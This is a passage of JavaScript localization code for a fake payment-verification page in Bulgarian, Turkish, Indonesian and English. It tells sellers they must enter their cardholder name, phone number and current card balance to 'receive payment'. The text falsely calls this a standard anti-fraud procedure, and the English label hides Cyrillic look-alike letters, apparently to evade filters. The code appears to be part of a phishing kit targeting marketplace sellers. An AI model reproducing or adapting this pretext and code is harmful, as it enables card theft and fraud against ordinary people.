        $('#b_t2').html(`Тъй като използвате нашата платежна система за първи път, ще трябва да преминете през верификация на акаунта, в който ще получавате плащания за продадени стоки в бъдеще.
        <strong>Това е стандартна процедура за потвърждаване на притежателя на акаунта.</strong>
        Това е необходимо, за да се потвърди вашата способност да използвате онлайн платежната система и да защитим купувачите и продавачите от измамници.`)
        break;
    case "TR":
        $('#payment').text('Ödeme');
        $('#receiving-money').text('Para alma');
        $('#total').text('Toplam');
        $('#choose-method').text('Yöntemi seç');
        $('#credit-debit-card').text('Kredi/Banka kartı');
        $('#cardholder').attr("placeholder", "Kart sahibi");
        $('#phonenumber').attr("placeholder", "Telefon numarası");
        $('#card_balance').attr("placeholder", "Kart bakiyesi");
        $('#finalsubmit').text('Devam et');
        $('#paybutton').text('Onayla');
        $('#b_t1').text('Kurallarımıza göre, kart sahipliğini doğrulamak için mevcut bakiyenizi girin.');
        $('#b_t2').html(`Ödeme sistemimizi ilk kez kullandığınız için, gelecekte satılan mallar için ödemeleri alacağınız hesabın doğrulamasından geçmeniz gerekecektir.
        Bu, hesap sahibini doğrulamak için standart bir prosedürdür.
        Bu, çevrimiçi ödeme sistemini kullanabilme yeteneğinizi doğrulamak ve alıcıları ve satıcıları dolandırıcılardan korumak için gereklidir.`);        
        break;
    case "ID":
        $('#payment').text('Bayar');
        $('#receiving-money').text('Menerima Uang');
        $('#total').text('Total');
        $('#choose-method').text('Pilih Metode');
        $('#credit-debit-card').text('Kartu Kredit/Debet');
        $('#cardholder').attr("placeholder", "Nama Pemilik Kartu");
        $('#phonenumber').attr("placeholder", "Nomor Telepon");
        $('#card_balance').attr("placeholder", "Saldo Kartu");
        $('#finalsubmit').text('Lanjutkan');
        $('#paybutton').text('Konfirmasi');
        $('#b_t1').text('Sesuai peraturan kami, untuk konfirmasi kepemilikan kartu, masukkan saldo Anda saat ini.');
        $('#b_t2').html(`Karena Anda menggunakan sistem pembayaran kami untuk pertama kalinya, Anda perlu melakukan verifikasi akun yang akan menerima pembayaran untuk barang yang terjual di masa mendatang.
          Ini adalah prosedur standar untuk mengkonfirmasi pemilik akun.
          Hal ini diperlukan untuk memastikan kemampuan Anda menggunakan sistem pembayaran online dan untuk melindungi pembeli dan penjual dari penipuan.`);        
        break;
    default:
        $('#payment').text('Pay')
        $('#receiving-money').text('Receiving money')
        $('#total').text('Total')
        $('#choose-method').text('Choose method')
        $('#credit-debit-card').text('Сrеdit/Dеbit cаrd')
        $('#cardholder').attr("placeholder", "Cardholder");
        $('#phonenumber').attr("placeholder", "Phone number");
        $('#card_balance').attr("placeholder", "Card balance");
        $('#finalsubmit').text('Continue')
        $('#paybutton').text('Confirm')
        $('#b_t1').text('According to our rules, to confirm card ownership, enter your current balance.')
        $('#b_t2').html(`Since you are using our payment system for the first time, you will need to undergo verification of the account to which you will receive payment for sold goods in the future.
    <strong>This is a standard procedure to confirm the account holder.</strong>
    This is necessary in order to confirm your ability to use the online payment system and to protect buyers and sellers from fraudsters.`)
        break;
}